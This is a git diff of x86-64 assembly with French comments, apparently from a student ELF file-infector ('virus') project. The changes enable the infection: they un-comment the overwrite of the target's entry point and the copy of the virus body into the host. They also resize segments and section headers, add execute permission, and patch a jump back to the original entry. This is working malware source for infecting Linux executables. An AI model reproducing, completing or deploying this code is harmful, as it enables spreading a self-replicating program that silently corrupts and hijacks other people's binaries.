@@ -26,7 +26,7 @@ get_file_data:
     
     xor rdi, rdi
     mov rsi, [r12 + fileSize]
-    add rsi, PROG_SIZE                      ; ajoute la taille du programe si on se met a le ragouter
+    add rsi, TOTAL_SIZE                      ; ajoute la taille du programe si on se met a le ragouter
     mov rdx, PROT_READ | PROT_WRITE
     mov r10, MAP_SHARED ; r10 est le 4 ieme argument car rcx et r11 sont détruit par le kernel
     mov r8, [r12 + fd]
@@ -39,16 +39,20 @@ get_file_data:
 
 check_signature:                ; boucle sur tout les bytes du fichier pour voir si il n'y a pas deja une signature
     xor rdx, rdx
-    lea rax, [rel signature]
+    lea rax, [rel signature + SIGNATURE_SIZE - 1]
     mov rbx, [r12 + fileSize]
     sub rbx, SIGNATURE_SIZE - 1
     jmp check_signature_cmp
     check_signature_loop:
         mov rdi, rax
         mov rsi, [r12 + fileData]
-        add rsi, rdx
-        mov rcx, SIGNATURE_SIZE  
+        add rsi, [r12 + fileSize]
+        sub rsi, rdx
+        dec rsi
+        mov rcx, SIGNATURE_SIZE
+        std
         repz cmpsb
+        cld
         jz close_mmap           ; on quite proprement si il y a deja une signature
         inc rdx  
     check_signature_cmp:
@@ -123,9 +127,9 @@ last_pload_found:                                                               
 increase_file_size:
     mov rdi, [r12 + fd]
     mov rsi, [r12 + fileData]
-    mov rdx, PROG_SIZE
+    mov rdx, TOTAL_SIZE
     mov rax, SYS_WRITE
-    syscall                     ;write(fd, filedata, PROG_SIZE);
+    syscall                     ;write(fd, filedata, TOTAL_SIZE);
     
 relocate_section_header:
     mov rsi, [r12 + fileData]
@@ -140,21 +144,21 @@ relocate_section_header:
     
     
     
-    add rdi, PROG_SIZE
+    add rdi, TOTAL_SIZE
     mov rcx, [r12 + fileSize]
     sub rcx, rdx
     mov rdx, rcx
     call ft_memrcpy
     
     mov rdi, rbx
-    mov rcx, rdx        ; int i = len
+    mov rcx, PROG_OFFSET        ; int i = len
     xor rax, rax        ; char c = '\0'
     rep stosb           ; while (i--) s[i] = c
 
 change_header:
-    add qword [r12 + fileSize], PROG_SIZE
+    add qword [r12 + fileSize], TOTAL_SIZE
     mov rax, [r12 + fileData]
-    add qword [rax + e_shoff], PROG_SIZE
+    add qword [rax + e_shoff], TOTAL_SIZE
 
 change_section_header:
     xor rbx, rbx
@@ -166,33 +170,43 @@ change_section_header:
     add rax, [rax + e_shoff]
     mov rsi, [r13 + p_offset]
     add rsi, [r13 + p_filesz]
+
+
     section_header_loop:
     cmp [rax + sh_offset], rsi
     jl no_section_change
-    add qword [rax + sh_offset], PROG_SIZE
-    add qword [rax + sh_addr], PROG_SIZE
+    add qword [rax + sh_offset], TOTAL_SIZE
+    add qword [rax + sh_addr], TOTAL_SIZE
+    jmp section_change
     no_section_change:
+    mov rdi , rax
+    section_change:
     inc rdx
     add rax, rcx
     cmp rdx, rbx
-    jle section_header_loop
+    jl section_header_loop
+change_.data_size:
+    add qword [rdi + sh_size], TOTAL_SIZE
 
 write_virus_entry:
-    mov rdi, [r13 + p_vaddr]             ; met l'entry a la fin du dernier pload = p_vaddr + p_memsz
-    add rdi, [r13 + p_memsz]
+    mov rdi, [r13 + p_vaddr]             ; met l'entry a la fin du dernier pload = p_vaddr + p_memsz + PROG_OFFSET
+    add rdi, [r13 + p_filesz]
+    add rdi, PROG_OFFSET
     mov [r12 + entry], rdi
     mov rsi, [r12 + fileData]           ; écrit la nouvelle entry dans l'executable
-;    mov [rsi + e_entry], rdi
+    mov [rsi + e_entry], rdi
 
 
 copy_program:
     mov rdi, [r12 + fileData]               ; address a la fin du premier pload
     add rdi, [r13 + p_offset]
     add rdi, [r13 + p_filesz]
+    add rdi, PROG_OFFSET
+
     mov rbx, rdi
     lea rsi, [rel main]                     ; address du debut du programe
     mov rcx, PROG_SIZE                      ; taille du programe
-;    rep movsb
+    rep movsb
     
     ; calcule le jump qu'il faut faire pour attendre l'entry normale 
     mov rdx, [r12 + entry]
@@ -204,8 +218,8 @@ copy_program:
     mov [rbx + JMP_OFFSET], byte 0xE9 ; 0xe9 = jmp
     mov [rbx + JMP_OFFSET + 1], ecx
     ; augmente la taille du premier pload
-    add qword [r13 + p_memsz], PROG_SIZE
-    add qword [r13 + p_filesz], PROG_SIZE
+    add qword [r13 + p_memsz], TOTAL_SIZE
+    add qword [r13 + p_filesz], TOTAL_SIZE
 
     or dword [r13 + p_flags], PF_X           ; ajoute les droit d'execution
     
